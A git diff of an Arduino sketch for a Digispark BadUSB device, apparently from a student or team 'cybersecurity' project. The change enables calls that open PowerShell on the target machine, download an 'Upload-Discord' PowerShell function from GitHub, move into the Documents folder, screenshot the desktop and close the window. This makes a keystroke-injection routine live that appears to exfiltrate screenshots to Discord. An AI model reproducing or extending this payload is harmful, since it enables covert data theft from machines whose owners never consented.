@@ -16,6 +16,8 @@
   PS = PowerShell
 */
 
+// MAIN BRANCH - Should have all features
+
 void getUploadDiscordFunction() {
   // downloads the Upload-Discord PS function from GitHub
   DigiKeyboard.delay(1000);
@@ -77,18 +79,18 @@ void screenshotTheDesktop() {
 
 void setup() {
   DigiKeyboard.update();
+  
+  enterPowerShell();
+  getUploadDiscordFunction();
 
-   enterPowerShell();
-   getUploadDiscordFunction();
-
-  // intoDocumentsFolder();
+  intoDocumentsFolder();
 
   screenshotTheDesktop();
   
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");  // closes the PowerShell window
 
-  // DEVELOPED BY MARCOS RODRIGUEZ (MIKE ROBLES) FOR TEAM ECHO
+  // DEVELOPED BY MARCOS RODRÍGUEZ NÚÑEZ (MIKE ROBLES) FOR TEAM ECHO
   // WATCHDOGS CYBERSECURITY - BADUSB PROJECT
   // JANUARY 2024
 }
